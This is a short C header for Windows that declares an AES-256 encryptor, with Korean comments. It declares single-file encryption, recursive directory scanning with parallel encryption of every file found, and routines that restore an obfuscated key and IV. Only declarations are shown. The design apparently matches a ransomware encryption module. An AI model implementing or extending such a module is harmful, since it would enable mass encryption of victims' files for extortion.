#ifndef ENCRYPTOR_H
#define ENCRYPTOR_H

#include <windows.h>

#define AES_KEY_SIZE   32      /* AES-256 */
#define AES_BLOCK_SIZE 16

#ifdef __cplusplus
extern "C" {
#endif

    /* 개별 파일 암호화(선택적 편의 API) */
    void encrypt_file(const char* filepath,
        const unsigned char* key,
        const unsigned char* iv);

    /* 디렉터리 재귀 스캔 + 병렬 암호화 (walker.obj가 요구) */
    void encrypt_filescan_and_encrypt(const char* target_dir);

    /* 난독화 해제용 키 / IV 복원 함수 */
    void restore_key(unsigned char* key_out);
    void restore_iv(unsigned char* iv_out);

#ifdef __cplusplus
}   /* extern "C" */
#endif
#endif /* ENCRYPTOR_H */
